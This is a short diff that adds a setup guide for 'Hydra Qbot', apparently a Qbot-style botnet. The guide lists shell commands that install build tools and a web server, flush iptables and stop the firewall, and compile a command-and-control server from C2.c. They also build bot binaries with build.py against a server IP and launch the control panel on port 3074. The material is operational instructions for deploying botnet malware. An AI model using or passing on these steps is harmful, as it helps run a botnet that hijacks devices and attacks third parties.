@@ -1,0 +1,8 @@
+Hydra Qbot By Hydra
+
+yum install gcc screen nano httpd python perl -y;
+iptables -F; service iptables stop; service httpd restart
+gcc C2.c -o cnc -pthread
+nano login.txt
+python build.py Hydra.c [srv ip]
+screen ./cnc 3074 850 [screenport]
